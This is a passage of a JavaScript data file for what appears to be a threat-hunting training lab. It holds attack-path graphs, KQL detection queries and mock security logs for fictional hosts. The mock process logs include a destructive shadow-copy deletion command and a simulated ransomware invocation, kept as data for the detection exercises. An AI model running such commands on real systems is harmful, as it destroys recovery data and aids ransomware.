  { id:'oauth-privileged-access', name:'OAuth applications with privileged access', question:'Which hybrid-owned OAuth apps can authenticate as privileged service principals?', techniques:['Privilege escalation','Lateral movement'], inputs:[],
    nodes:['user-hybrid','app-syncbridge','sp-automation','subscription-prod'],
    edges:[{from:'user-hybrid',to:'app-syncbridge',label:'owns'},{from:'app-syncbridge',to:'sp-automation',label:'can authenticate as'},{from:'sp-automation',to:'subscription-prod',label:'has role on'}] },
  { id:'paths-sensitive-identities', name:'Paths to sensitive identities', question:'Which non-privileged identities have permission paths to sensitive identities?', techniques:['Privilege escalation','Lateral movement'], inputs:[],
    nodes:['user-jordan','group-helpdesk','user-helpdesk','user-tier0'],
    edges:[{from:'user-jordan',to:'group-helpdesk',label:'member of'},{from:'group-helpdesk',to:'user-helpdesk',label:'has permissions to'},{from:'user-helpdesk',to:'user-tier0',label:'has permissions to'}] },
  { id:'service-rdp-critical', name:'Service accounts with RDP to critical devices', question:'Which service accounts retain RDP access to critical devices?', techniques:['Lateral movement'], inputs:[],
    nodes:['svc-backup','device-admin01','server-finfs02'],
    edges:[{from:'svc-backup',to:'device-admin01',label:'can authenticate to'},{from:'svc-backup',to:'server-finfs02',label:'can authenticate to',shortest:false}] },
  { id:'kerberoast-critical', name:'Kerberoast paths to critical assets', question:'Where can a Kerberoast-vulnerable account lead after compromise?', techniques:['Privilege escalation','Credential access'], inputs:[],
    nodes:['device-edge01','svc-sql','group-cloud','sql-finance'],
    edges:[{from:'device-edge01',to:'svc-sql',label:'has credentials of'},{from:'svc-sql',to:'group-cloud',label:'member of'},{from:'group-cloud',to:'sql-finance',label:'has permissions to'}] },
  { id:'least-privilege', name:'Least privilege access', question:'Which synced users have excessive permissions on cloud resources?', techniques:['Lateral movement','Collection'], inputs:[],
    nodes:['user-jordan','group-cloud','subscription-prod','storage-payroll'],
    edges:[{from:'user-jordan',to:'group-cloud',label:'member of'},{from:'group-cloud',to:'subscription-prod',label:'has role on'},{from:'subscription-prod',to:'storage-payroll',label:'contains'}] },
  { id:'external-cloud-access', name:'External users with cloud resource access', question:'Which guest accounts have privileged access to cloud resources?', techniques:['Lateral movement','Collection'], inputs:[],
    nodes:['guest-kim','group-cloud','subscription-prod','kv-prod'],
    edges:[{from:'guest-kim',to:'group-cloud',label:'member of'},{from:'group-cloud',to:'subscription-prod',label:'has role on'},{from:'subscription-prod',to:'kv-prod',label:'contains'}] },
  { id:'domain-compromise', name:'Paths to domain compromise (DCSync)', question:'Which non-privileged identities have hidden paths to domain replication rights?', techniques:['Lateral movement','Privilege escalation','Credential access'], inputs:[],
    nodes:['user-jordan','group-helpdesk','user-helpdesk','tenant-hacksmarterlabs','server-dc01'],
    edges:[{from:'user-jordan',to:'group-helpdesk',label:'member of'},{from:'group-helpdesk',to:'user-helpdesk',label:'can impersonate as'},{from:'user-helpdesk',to:'tenant-hacksmarterlabs',label:'has permissions to'},{from:'tenant-hacksmarterlabs',to:'server-dc01',label:'contains'}] },
  { id:'domain-admins', name:'Paths to domain admins', question:'Which paths could elevate non-privileged users into Domain Admins?', techniques:['Privilege escalation','Lateral movement'], inputs:[],
    nodes:['user-jordan','group-helpdesk','user-helpdesk','group-domainadmins'],
    edges:[{from:'user-jordan',to:'group-helpdesk',label:'member of'},{from:'group-helpdesk',to:'user-helpdesk',label:'can impersonate as'},{from:'user-helpdesk',to:'group-domainadmins',label:'has permissions to'}] },
  { id:'exposed-rdp-critical', name:'Exposed users with RDP to critical assets', question:'Which exposed users have multi-step RDP paths to critical assets?', techniques:['Privilege escalation','Lateral movement','Credential access'], inputs:[],
    nodes:['device-edge01','user-helpdesk','svc-backup','server-finfs02'],
    edges:[{from:'device-edge01',to:'user-helpdesk',label:'frequently logged in by'},{from:'user-helpdesk',to:'svc-backup',label:'has credentials of'},{from:'svc-backup',to:'server-finfs02',label:'can authenticate to'}] },
  { id:'asrep-critical', name:'AS-REP roast paths to critical assets', question:'Which AS-REP-vulnerable accounts lead to sensitive on-premises assets?', techniques:['Privilege escalation','Credential access'], inputs:[],
    nodes:['device-edge01','user-asrep','group-domainadmins','server-dc01'],
    edges:[{from:'device-edge01',to:'user-asrep',label:'has credentials of'},{from:'user-asrep',to:'group-domainadmins',label:'member of'},{from:'group-domainadmins',to:'server-dc01',label:'has permissions to'}] },
];

const HUNTING_GRAPH_FILTERS = [
  'Shortest paths only',
  'Source is critical',
  'Target has sensitive data',
  'Node is vulnerable',
  'Node is exposed to internet',
  'Edge type: has permissions to',
  'Edge type: can authenticate as',
  'Edge type: member of',
  'Edge type: can impersonate as',
];

const SAVED_QUERIES = [
  { name:'Process executions from Public folder',
    table:'DeviceProcessEvents', description:'Binaries running out of C:\\Users\\Public are commonly attacker staging.',
    query:`DeviceProcessEvents\n| where FolderPath startswith "C:\\Users\\Public"\n| where InitiatingProcessFileName !in ("explorer.exe","msiexec.exe")\n| where SHA256 has "c"\n| project Timestamp, DeviceName, FileName, FolderPath, SHA256, AccountName\n| top 100 by Timestamp desc` },
  { name:'OAuth consent to risky apps',
    table:'CloudAppEvents', description:'New OAuth consent grants to apps with broad mail/files scopes.',
    query:`CloudAppEvents\n| where ActionType == "Consent to application"\n| extend Perms = tostring(RawEventData.ModifiedProperties)\n| where Perms has_any ("Mail.ReadWrite","Files.Read.All","User.Read.All")\n| project Timestamp, AccountDisplayName, ApplicationId, Perms` },
  { name:'Suspicious DC replication',
    table:'IdentityLogonEvents', description:'Detect possible DCSync via accounts that should not replicate.',
    query:`IdentityLogonEvents\n| where ActionType == "DirectoryServicesReplication"\n| where AccountName !in ("krbtgt","Administrator")\n| project Timestamp, AccountName, DeviceName, IPAddress` },
  { name:'Ransomware shadow copy deletion',
    table:'DeviceProcessEvents', description:'Find vssadmin shadow-copy deletion used before encryption.',
    query:`DeviceProcessEvents\n| where FileName == "vssadmin.exe"\n| project Timestamp, DeviceName, FileName, ProcessCommandLine, AccountName` },
  { name:'Risky sign-ins by user',
    table:'SigninLogs', description:'Filter Entra sign-in rows for high-risk users.',
    query:`SigninLogs\n| where UserPrincipalName == "sam.lee@hacksmarterlabs.example"\n| project TimeGenerated, UserPrincipalName, IPAddress, RiskLevel, ResultType` },
  { name:'Container namespace escape signal',
    table:'ContainerEvents', description:'Look for container processes touching host namespaces.',
    query:`ContainerEvents\n| where ClusterName == "aks-prod"\n| where Syscall == "setns"\n| project TimeGenerated, ClusterName, PodName, Image, Syscall, NodeName` },
  { name:'Endpoint ↔ identity logon join (AccountSid)',
    table:'DeviceLogonEvents', description:'Canonical SC-200 pattern: correlate an endpoint logon to a domain auth event using AccountSid within a ±2 min window.',
    query:`DeviceLogonEvents\n| where Timestamp > ago(1d)\n| join kind=inner (\n    IdentityLogonEvents\n    | where Timestamp > ago(1d)\n    | project IdTime=Timestamp, AccountSid, IPAddress, Application, IdActionType=ActionType\n  ) on AccountSid\n| where abs(datetime_diff('second', Timestamp, IdTime)) < 120\n| project Timestamp, DeviceName, AccountName, AccountSid, LogonType, RemoteIP, IPAddress, Application, IdActionType` },
  { name:'Failed interactive logons by SID',
    table:'DeviceLogonEvents', description:'Repeated LogonFailed events for the same SID — bruteforce or stale creds.',
    query:`DeviceLogonEvents\n| where ActionType == "LogonFailed"\n| where LogonType == "Interactive"\n| summarize Attempts=count() by AccountSid, AccountName, DeviceName, bin(Timestamp, 5m)\n| where Attempts >= 3` },
  { name:'Cloud storage public access changes',
    table:'CloudAppEvents', description:'Find storage ACL changes that expose buckets or containers.',
    query:`CloudAppEvents\n| where ActionType == "PutBucketAcl"\n| where BucketName == "aws-s3-prod-logs"\n| project Timestamp, AccountDisplayName, ActionType, BucketName, AccessLevel` },
  { name:'Find all devices that are internet facing',
    table:'DeviceInfo', description:'Surface endpoints that received external incoming communication.',
    query:`DeviceInfo\n| where IsInternetFacing == true\n| project Timestamp, DeviceName, OSPlatform, PublicIP, IsInternetFacing, ExposureLevel` },
  { name:'Graph app mailbox access after consent',
    table:'GraphActivityLogs', description:'Review Graph calls made by an OAuth app after a risky consent grant.',
    query:`GraphActivityLogs\n| where AppDisplayName == "DocViewer Pro"\n| project TimeGenerated, UserPrincipalName, AppDisplayName, Operation, RequestUri, IPAddress, ResultStatus` },
];

const KQL_PRACTICE_ROWS = [
  { TimeGenerated:'2026-07-06T09:10:00Z', Scenario:'endpoint staging',
    Message:'user=jane.doe@hacksmarterlabs.example ip=76.21.55.4 action=allow', Payload:'{"user":"jane.doe@hacksmarterlabs.example","device":"WKS-03","risk":"High"}', Tags:'finance|priority|cloud',
    Domain:'secure-document-portal.xyz', Source:'DeviceProcessEvents' },
  { TimeGenerated:'2026-07-06T10:12:00Z', Scenario:'identity pivot',
    Message:'user=sam.lee@hacksmarterlabs.example ip=91.219.236.54 action=block', Payload:'{"user":"sam.lee@hacksmarterlabs.example","device":"WKS-11","risk":"Medium"}', Tags:'identity|risk|mfa',
    Domain:'login.hacksmarterlabs.example', Source:'SigninLogs' },
  { TimeGenerated:'2026-07-06T10:14:00Z', Scenario:'cloud app follow-up',
    Message:'user=maria.ross@hacksmarterlabs.example ip=185.199.111.12 action=alert', Payload:'{"user":"maria.ross@hacksmarterlabs.example","device":"LAP-07","risk":"High"}', Tags:'cloud|oauth|mail',
    Domain:'bad-demo.example', Source:'CloudAppEvents' },
];

const SENTINEL_RESTORE_JOB = {
  sourceTable:'ArchiveDns_CL',
  resultTable:'ArchiveDns_RST',
  status:'Running',
  scope:'Long-retention Data lake query',
  costNote:'Restoring a narrow slice is cheaper than querying the full retained table repeatedly.',
  scopeNote:'Use a restore job when the investigation needs a reusable table rather than a one-off long-range hunt.',
  query:`ArchiveDns_CL
| where TimeGenerated between (datetime(2026-06-12T00:00:00Z) .. datetime(2026-06-21T23:59:59Z))
| where DnsQuery has_any ("sync-a.bad-demo.example","cdn-metrics.hacksmarterlabs.example")
| summarize QueryCount=count(), UniqueHosts=dcount(SrcHostname) by DnsQuery, bin(TimeGenerated, 1d)
| project TimeGenerated, DnsQuery, QueryCount, UniqueHosts`,
  results:[
    { TimeGenerated:'2026-06-12T00:00:00Z', DnsQuery:'sync-a.bad-demo.example', QueryCount:341, UniqueHosts:2, SourceTable:'ArchiveDns_CL', RestoreJobId:'RST-8401' },
    { TimeGenerated:'2026-06-13T00:00:00Z', DnsQuery:'sync-a.bad-demo.example', QueryCount:328, UniqueHosts:2, SourceTable:'ArchiveDns_CL', RestoreJobId:'RST-8401' },
    { TimeGenerated:'2026-06-21T00:00:00Z', DnsQuery:'cdn-metrics.hacksmarterlabs.example', QueryCount:411, UniqueHosts:1, SourceTable:'ArchiveDns_CL', RestoreJobId:'RST-8401' },
  ],
};

const ARCHIVE_DNS_AUX_ROWS = [
  { TimeGenerated:'2026-06-12T00:00:00Z', DnsQuery:'sync-a.bad-demo.example', QueryCount:341, UniqueHosts:2, Tier:'Auxiliary', SourceTable:'ArchiveDns_CL' },
  { TimeGenerated:'2026-06-13T00:00:00Z', DnsQuery:'sync-a.bad-demo.example', QueryCount:328, UniqueHosts:2, Tier:'Auxiliary', SourceTable:'ArchiveDns_CL' },
  { TimeGenerated:'2026-06-21T00:00:00Z', DnsQuery:'cdn-metrics.hacksmarterlabs.example', QueryCount:411, UniqueHosts:1, Tier:'Auxiliary', SourceTable:'ArchiveDns_CL' },
];

const MOCK_QUERY_RESULTS = {
  DeviceInfo: [
    { Timestamp:'2026-06-28T15:02:11Z', DeviceName:'WKS-03', OSPlatform:'Windows 11 Enterprise',
      PublicIP:'198.51.100.41', IsInternetFacing:true, ExposureLevel:'High' },
    { Timestamp:'2026-06-28T10:22:00Z', DeviceName:'FIN-FS-02', OSPlatform:'Windows Server 2022',
      PublicIP:'', IsInternetFacing:false, ExposureLevel:'Medium' },
  ],
  DeviceProcessEvents: [
    { Timestamp:'2026-06-28T15:00:01Z', DeviceName:'WKS-03', FileName:'scanner.exe',
      FolderPath:'C:\\Users\\Public\\scanner.exe', SHA256:ROGUE_HASH.slice(0,16)+'…', AccountName:'jdoe' },
    { Timestamp:'2026-06-28T14:15:02Z', DeviceName:'WKS-02', FileName:'scanner.exe',
      FolderPath:'C:\\Tools\\Scanner\\scanner.exe', SHA256:POST_UPDATE_HASH.slice(0,16)+'…', AccountName:'svc-scan' },
    { Timestamp:'2026-06-28T14:00:11Z', DeviceName:'WKS-01', FileName:'scanner.exe',
      FolderPath:'C:\\Tools\\Scanner\\scanner.exe', SHA256:POST_UPDATE_HASH.slice(0,16)+'…', AccountName:'svc-scan' },
    { Timestamp:'2026-06-28T09:05:00Z', DeviceName:'WKS-02', FileName:'scanner.exe',
      FolderPath:'C:\\Tools\\Scanner\\scanner.exe', SHA256:KNOWN_GOOD_HASH.slice(0,16)+'…', AccountName:'svc-scan' },
    { Timestamp:'2026-06-28T10:20:04Z', DeviceName:'FIN-FS-02', FileName:'vssadmin.exe',
      FolderPath:'C:\\Windows\\System32\\vssadmin.exe', SHA256:'eeeeeeeeeeeeeeee…', AccountName:'fin-svc',
      ProcessCommandLine:'vssadmin delete shadows /all /quiet' },
    { Timestamp:'2026-06-28T10:18:21Z', DeviceName:'FIN-FS-02', FileName:'locker.exe',
      FolderPath:'C:\\ProgramData\\locker.exe', SHA256:'dddddddddddddddd…', AccountName:'fin-svc',
      ProcessCommandLine:'locker.exe --encrypt --shares' },
  ],
  CloudAppEvents: [
    { Timestamp:'2026-06-28T08:23:00Z', AccountDisplayName:'Jane Doe',
      ApplicationId:'b9f2…ad21', ActionType:'Consent to application',
      RawEventData:{ ModifiedProperties:'Mail.ReadWrite, Files.Read.All' },
      Perms:'Mail.ReadWrite, Files.Read.All' },
    { Timestamp:'2026-06-28T07:52:14Z', AccountDisplayName:'aws-prod-breakglass',
      ActionType:'PutBucketAcl', BucketName:'aws-s3-prod-logs', AccessLevel:'public-read' },
  ],
  GraphActivityLogs: [
    { TimeGenerated:'2026-06-28T08:31:00Z', UserPrincipalName:'jane.doe@hacksmarterlabs.example',
      AppDisplayName:'DocViewer Pro', AppId:'b9f2-demo-ad21', Operation:'Mail.Read',
      RequestUri:'/users/jane.doe@hacksmarterlabs.example/messages', IPAddress:'76.21.55.4', ResultStatus:'Success' },
    { TimeGenerated:'2026-06-28T08:33:12Z', UserPrincipalName:'jane.doe@hacksmarterlabs.example',
      AppDisplayName:'DocViewer Pro', AppId:'b9f2-demo-ad21', Operation:'Files.Read.All',
      RequestUri:'/users/jane.doe@hacksmarterlabs.example/drive/root/search(q=invoice)', IPAddress:'76.21.55.4', ResultStatus:'Success' },
    { TimeGenerated:'2026-06-28T08:36:44Z', UserPrincipalName:'jane.doe@hacksmarterlabs.example',
      AppDisplayName:'DocViewer Pro', AppId:'b9f2-demo-ad21', Operation:'Mail.Send',
      RequestUri:'/users/jane.doe@hacksmarterlabs.example/sendMail', IPAddress:'76.21.55.4', ResultStatus:'Denied' },
    { TimeGenerated:'2026-06-28T13:34:09Z', UserPrincipalName:'sam.lee@hacksmarterlabs.example',
      AppDisplayName:'Graph PowerShell', AppId:'graph-powershell-demo', Operation:'Directory.Read.All',
      RequestUri:'/users?$select=id,userPrincipalName', IPAddress:'91.219.236.54', ResultStatus:'ConditionalAccessBlocked' },
  ],
  DeviceLogonEvents: [
    { Timestamp:'2026-07-06T03:44:05Z', DeviceName:'FIN-FS-02', ActionType:'LogonSuccess',
      LogonType:'Network', AccountName:'svc-backup', AccountDomain:'HACKSMARTERLABS',
      AccountSid:'S-1-5-21-1180699209-877415012-3182924384-1144',
      RemoteIP:'10.20.4.55', RemoteDeviceName:'DC01', Protocol:'Kerberos', IsLocalAdmin:false },
    { Timestamp:'2026-07-06T10:17:55Z', DeviceName:'FIN-FS-02', ActionType:'LogonSuccess',
      LogonType:'RemoteInteractive', AccountName:'fin-svc', AccountDomain:'HACKSMARTERLABS',
      AccountSid:'S-1-5-21-1180699209-877415012-3182924384-2207',
      RemoteIP:'10.20.7.14', RemoteDeviceName:'WKS-03', Protocol:'NTLM', IsLocalAdmin:true },
    { Timestamp:'2026-07-06T14:59:48Z', DeviceName:'WKS-03', ActionType:'LogonFailed',
      LogonType:'Interactive', AccountName:'jdoe', AccountDomain:'HACKSMARTERLABS',
      AccountSid:'S-1-5-21-1180699209-877415012-3182924384-1812',
      FailureReason:'BadPassword', Protocol:'Kerberos', IsLocalAdmin:false },
    { Timestamp:'2026-07-06T14:59:52Z', DeviceName:'WKS-03', ActionType:'LogonFailed',
      LogonType:'Interactive', AccountName:'jdoe', AccountDomain:'HACKSMARTERLABS',
      AccountSid:'S-1-5-21-1180699209-877415012-3182924384-1812',
      FailureReason:'BadPassword', Protocol:'Kerberos', IsLocalAdmin:false },
    { Timestamp:'2026-07-06T14:59:57Z', DeviceName:'WKS-03', ActionType:'LogonFailed',
      LogonType:'Interactive', AccountName:'jdoe', AccountDomain:'HACKSMARTERLABS',
      AccountSid:'S-1-5-21-1180699209-877415012-3182924384-1812',
      FailureReason:'BadPassword', Protocol:'Kerberos', IsLocalAdmin:false },
    { Timestamp:'2026-07-06T15:00:00Z', DeviceName:'WKS-03', ActionType:'LogonSuccess',
      LogonType:'Interactive', AccountName:'jdoe', AccountDomain:'HACKSMARTERLABS',
      AccountSid:'S-1-5-21-1180699209-877415012-3182924384-1812',
      RemoteIP:'', Protocol:'Kerberos', IsLocalAdmin:false },
  ],
  IdentityLogonEvents: [
    { Timestamp:'2026-07-06T03:44:00Z', ActionType:'LogonSuccess', Application:'Active Directory',
      LogonType:'Network', Protocol:'Kerberos',
      AccountName:'svc-backup', AccountDomain:'HACKSMARTERLABS',
      AccountUpn:'svc-backup@hacksmarterlabs.example',
      AccountSid:'S-1-5-21-1180699209-877415012-3182924384-1144',
      AccountObjectId:'9b21a4e0-1f44-4b13-9fd0-1f6b8a3c0011',
      DeviceName:'DC01', IPAddress:'10.20.4.55', DestinationDeviceName:'DC01' },
    { Timestamp:'2026-07-06T03:46:00Z', ActionType:'DirectoryServicesReplication', Application:'Active Directory',
      LogonType:'Network', Protocol:'Kerberos',
      AccountName:'svc-backup', AccountDomain:'HACKSMARTERLABS',
      AccountUpn:'svc-backup@hacksmarterlabs.example',
      AccountSid:'S-1-5-21-1180699209-877415012-3182924384-1144',
      AccountObjectId:'9b21a4e0-1f44-4b13-9fd0-1f6b8a3c0011',
      DeviceName:'DC01', IPAddress:'10.20.4.55', DestinationDeviceName:'DC01' },
    { Timestamp:'2026-07-06T10:17:58Z', ActionType:'LogonSuccess', Application:'Active Directory',
      LogonType:'Remote interactive', Protocol:'NTLM',
      AccountName:'fin-svc', AccountDomain:'HACKSMARTERLABS',
      AccountUpn:'fin-svc@hacksmarterlabs.example',
      AccountSid:'S-1-5-21-1180699209-877415012-3182924384-2207',
      AccountObjectId:'1c54f7d2-8e09-4d3b-b71a-2cf90a4f7d22',
      DeviceName:'WKS-03', IPAddress:'10.20.7.14', DestinationDeviceName:'FIN-FS-02' },
    { Timestamp:'2026-07-06T14:59:55Z', ActionType:'LogonFailed', Application:'Active Directory',
      LogonType:'Interactive', Protocol:'Kerberos', FailureReason:'BadPassword',
      AccountName:'jdoe', AccountDomain:'HACKSMARTERLABS',
      AccountUpn:'jane.doe@hacksmarterlabs.example',
      AccountSid:'S-1-5-21-1180699209-877415012-3182924384-1812',
      AccountObjectId:'7f2b1e90-5c10-4ad9-b3e3-44ea7c8b1cf3',
      DeviceName:'WKS-03', IPAddress:'10.20.7.42' },
  ],
  SigninLogs: [
    { TimeGenerated:'2026-06-28T13:27:00Z', UserPrincipalName:'sam.lee@hacksmarterlabs.example',
      IPAddress:'91.219.236.54', RiskLevel:'High', ResultType:'0' },
    { TimeGenerated:'2026-06-28T06:40:00Z', UserPrincipalName:'maria.ross@hacksmarterlabs.example',
      IPAddress:'185.199.111.12', RiskLevel:'High', ResultType:'0' },
  ],
  ContainerEvents: [
    { TimeGenerated:'2026-06-28T12:01:00Z', ClusterName:'aks-prod', PodName:'pod-api-77',
      Image:'hacksmarterlabs/api:2026.06', Syscall:'setns', NodeName:'aks-prod/node-3' },
  ],
  SecurityEvent: [
    { TimeGenerated:'2026-07-06T08:12:00Z', Computer:'DC01', EventID:4624,
      Account:'EXAMPLE\\svc-backup', Activity:'An account was successfully logged on', IpAddress:'10.20.4.55', LogonType:3 },
    { TimeGenerated:'2026-07-06T08:14:32Z', Computer:'WKS-03', EventID:4625,
      Account:'EXAMPLE\\jdoe', Activity:'An account failed to log on', IpAddress:'10.20.7.42', LogonType:2 },
    { TimeGenerated:'2026-07-06T08:16:18Z', Computer:'FIN-FS-02', EventID:4672,
      Account:'EXAMPLE\\fin-svc', Activity:'Special privileges assigned to new logon', IpAddress:'10.20.7.14', LogonType:10 },
    { TimeGenerated:'2026-07-06T08:17:44Z', Computer:'WKS-03', EventID:4688,
      Account:'EXAMPLE\\jdoe', Activity:'A new process has been created', NewProcessName:'C:\\Users\\Public\\scanner.exe' },
  ],
  WindowsEvent: [
    { TimeGenerated:'2026-07-06T08:12:00Z', Computer:'DC01', EventID:4624, Channel:'Security',
      Provider:'Windows-Security-Auditing', RenderedDescription:'Successful logon for EXAMPLE\\svc-backup' },
    { TimeGenerated:'2026-07-06T08:17:44Z', Computer:'WKS-03', EventID:4688, Channel:'Security',
      Provider:'Windows-Security-Auditing', RenderedDescription:'Process creation for C:\\Users\\Public\\scanner.exe' },
  ],
  CommonSecurityLog: [
    { TimeGenerated:'2026-07-06T08:20:00Z', DeviceVendor:'Hack Smarter Labs Firewall', DeviceProduct:'EdgeFW',
      DeviceAction:'deny', LogSeverity:'High', SourceIP:'10.20.7.14', DestinationIP:'203.0.113.10', DestinationPort:443 },
    { TimeGenerated:'2026-07-06T08:21:08Z', DeviceVendor:'Fabrikam Mail', DeviceProduct:'MailSecure',
      DeviceAction:'quarantine', LogSeverity:'Medium', SourceIP:'198.51.100.77', DestinationIP:'10.20.5.22', DestinationPort:25 },
    { TimeGenerated:'2026-07-06T08:22:15Z', DeviceVendor:'Hack Smarter Labs Firewall', DeviceProduct:'EdgeFW',
      DeviceAction:'allow', LogSeverity:'Low', SourceIP:'10.20.6.19', DestinationIP:'198.51.100.22', DestinationPort:443 },
  ],
  AzureActivity: [
    { TimeGenerated:'2026-07-06T07:50:00Z', SubscriptionId:'sub-prod-001',
      Caller:'cloudadmin@hacksmarterlabs.example', OperationNameValue:'Cloud.Authorization/roleAssignments/write',
      ActivityStatusValue:'Succeeded', ResourceGroup:'rg-prod-identity', ResourceProviderValue:'Cloud.Authorization' },
    { TimeGenerated:'2026-07-06T07:57:31Z', SubscriptionId:'sub-shared-002',
      Caller:'platformops@hacksmarterlabs.example', OperationNameValue:'Cloud.Authorization/policyAssignments/write',
      ActivityStatusValue:'Succeeded', ResourceGroup:'rg-policy', ResourceProviderValue:'Cloud.Authorization' },
    { TimeGenerated:'2026-07-06T08:05:44Z', SubscriptionId:'sub-prod-001',
      Caller:'storage-owner@hacksmarterlabs.example', OperationNameValue:'Cloud.Storage/storageAccounts/write',
      ActivityStatusValue:'Succeeded', ResourceGroup:'rg-prod-storage', ResourceProviderValue:'Cloud.Storage' },
  ],
  ArchiveDns_CL: ARCHIVE_DNS_AUX_ROWS,
  ArchiveDns_RST: SENTINEL_RESTORE_JOB.results,
  AppRiskEvents_CL: [
    { TimeGenerated:'2026-07-06T08:31:00Z', AppId:'app-expense-portal',
      UserPrincipalName:'maria.ross@hacksmarterlabs.example', SourceIp:'203.0.113.44', RiskScore:92, Action:'BlockedOAuthCallback' },
    { TimeGenerated:'2026-07-06T08:34:18Z', AppId:'app-partner-sync',
      UserPrincipalName:'svc-partner@hacksmarterlabs.example', SourceIp:'198.51.100.64', RiskScore:35, Action:'AllowedSync' },
    { TimeGenerated:'2026-07-06T08:39:02Z', AppId:'app-expense-portal',
      UserPrincipalName:'sam.lee@hacksmarterlabs.example', SourceIp:'203.0.113.89', RiskScore:78, Action:'HighRiskTokenUse' },
  ],
  KQLPractice_CL: KQL_PRACTICE_ROWS,
};

const KQL_EXTERNALDATA_CSV = `Domain,Category,Priority
secure-document-portal.xyz,phish,1
login.hacksmarterlabs.example,auth,2
bad-demo.example,phish,1
update.example,benign,3`;

const ASIM_AUTHENTICATION_ROWS = [
  { TimeGenerated:'2026-07-06T03:44:00Z', EventVendor:'Hack Smarter Labs', EventProduct:'Windows', EventSchema:'Authentication', EventType:'Logon', EventResult:'Success',
    SrcIpAddr:'10.20.4.55', DstIpAddr:'10.20.4.10', SrcHostname:'DC01', DstHostname:'DC01', TargetUserName:'svc-backup', DvcAction:'LogonSuccess', Dvc:'DC01' },
  { TimeGenerated:'2026-07-06T10:17:58Z', EventVendor:'Hack Smarter Labs', EventProduct:'Entra ID', EventSchema:'Authentication', EventType:'Logon', EventResult:'Success',
    SrcIpAddr:'91.219.236.54', DstIpAddr:'52.96.0.0', SrcHostname:'unknown', DstHostname:'login.identity.example', TargetUserName:'sam.lee@hacksmarterlabs.example', DvcAction:'MFA satisfied', Dvc:'AAD' },
  { TimeGenerated:'2026-07-06T13:27:00Z', EventVendor:'Hack Smarter Labs', EventProduct:'Entra ID', EventSchema:'Authentication', EventType:'Logon', EventResult:'Failure',
    SrcIpAddr:'91.219.236.54', DstIpAddr:'52.96.0.0', SrcHostname:'proxy-91-219-236-54', DstHostname:'login.identity.example', TargetUserName:'sam.lee@hacksmarterlabs.example', DvcAction:'Risky sign-in', Dvc:'AAD' },
  { TimeGenerated:'2026-07-06T06:40:00Z', EventVendor:'Hack Smarter Labs', EventProduct:'Entra ID', EventSchema:'Authentication', EventType:'Logon', EventResult:'Success',
    SrcIpAddr:'185.199.111.12', DstIpAddr:'52.96.0.0', SrcHostname:'aitm-gateway', DstHostname:'login.identity.example', TargetUserName:'maria.ross@hacksmarterlabs.example', DvcAction:'MFA proxied', Dvc:'AAD' },
];

const ASIM_AUTHENTICATION_SAVED_QUERIES = [
  {
    name:'Risky sign-ins and logons',
    description:'Identify successful and failed authentication rows for a user after a suspicious sign-in.',
    expectedRows:3,
    query:`_Im_Authentication(starttime=ago(1d), eventtype="Logon")
| where TargetUserName in ("sam.lee@hacksmarterlabs.example","maria.ross@hacksmarterlabs.example")
| project TimeGenerated, SrcIpAddr, TargetUserName, EventProduct, EventResult, DvcAction`,
  },
  {
    name:'Failed sign-ins from one IP',
    description:'Filter the normalized auth rows to an attacker source and review the outcome.',
    expectedRows:1,
    query:`_Im_Authentication(eventtype="Logon")
| where SrcIpAddr == "91.219.236.54"
| where EventResult == "Failure"
| project TimeGenerated, SrcIpAddr, TargetUserName, EventProduct, EventResult`,
  },
  {
    name:'Entra MFA-proxied activity',
    description:'Show the rows that look like MFA was satisfied through a proxy or AiTM flow.',
    expectedRows:1,
    query:`_Im_Authentication(eventtype="Logon")
| where DvcAction == "MFA proxied"
| project TimeGenerated, SrcIpAddr, TargetUserName, DvcAction, Dvc`,
  },
];

const ASIM_AUTHENTICATION_NOTES = [
  { title:'Normalization target', detail:'Authentication rows collapse source details into SrcIpAddr, TargetUserName, EventResult, and Dvc fields so sign-in and logon hunts can share one query shape.' },
  { title:'Source mapping', detail:'Windows event 4624/4625, Entra sign-in logs, and proxy records all feed the same parser-style experience in this lab.' },
  { title:'Investigation pivot', detail:'Use the normalized output to pivot back to the original sign-in or domain controller evidence before making response decisions.' },
];

const ASIM_NETWORK_SESSION_ROWS = [
  { TimeGenerated:'2026-07-06T08:20:00Z', EventVendor:'Hack Smarter Labs Firewall', EventProduct:'EdgeFW', EventSchema:'NetworkSession', EventType:'NetworkSession', EventResult:'Allowed',
    SrcIpAddr:'10.20.7.14', DstIpAddr:'203.0.113.10', SrcHostname:'WKS-03', DstHostname:'bad-demo.example', SrcPortNumber:51550, DstPortNumber:443, NetworkDirection:'Outbound', DvcAction:'allow' },
  { TimeGenerated:'2026-07-06T08:21:08Z', EventVendor:'Fabrikam Mail', EventProduct:'MailSecure', EventSchema:'NetworkSession', EventType:'NetworkSession', EventResult:'Blocked',
    SrcIpAddr:'198.51.100.77', DstIpAddr:'10.20.5.22', SrcHostname:'mail-gateway', DstHostname:'EXCH-01', SrcPortNumber:25, DstPortNumber:25, NetworkDirection:'Inbound', DvcAction:'quarantine' },
  { TimeGenerated:'2026-07-06T08:22:15Z', EventVendor:'Hack Smarter Labs Firewall', EventProduct:'EdgeFW', EventSchema:'NetworkSession', EventType:'NetworkSession', EventResult:'Allowed',
    SrcIpAddr:'10.20.6.19', DstIpAddr:'198.51.100.22', SrcHostname:'WKS-11', DstHostname:'update.example', SrcPortNumber:51234, DstPortNumber:443, NetworkDirection:'Outbound', DvcAction:'allow' },
  { TimeGenerated:'2026-07-06T08:23:44Z', EventVendor:'Hack Smarter Labs Firewall', EventProduct:'EdgeFW', EventSchema:'NetworkSession', EventType:'NetworkSession', EventResult:'Blocked',
    SrcIpAddr:'10.20.4.55', DstIpAddr:'203.0.113.10', SrcHostname:'DC01', DstHostname:'bad-demo.example', SrcPortNumber:49610, DstPortNumber:443, NetworkDirection:'Outbound', DvcAction:'deny' },
];

const ASIM_NETWORK_SESSION_SAVED_QUERIES = [
  {
    name:'Blocked outbound sessions',
    description:'Show blocked outbound sessions toward the demo IOC domain.',
    expectedRows:1,
    query:`_Im_NetworkSession(starttime=ago(1d), eventtype="NetworkSession")
| where NetworkDirection == "Outbound"
| where EventResult == "Blocked"
| project TimeGenerated, SrcIpAddr, DstIpAddr, SrcHostname, DstHostname, DvcAction`,
  },
  {
    name:'Outbound sessions to risky domain',
    description:'Follow outbound network sessions where the destination hostname matches the phish demo domain.',
    expectedRows:2,
    query:`_Im_NetworkSession(eventtype="NetworkSession")
| where DstHostname has "bad-demo.example"
| project TimeGenerated, SrcIpAddr, DstIpAddr, SrcHostname, DstHostname, NetworkDirection, EventResult`,
  },
  {
    name:'Sessions by source host',
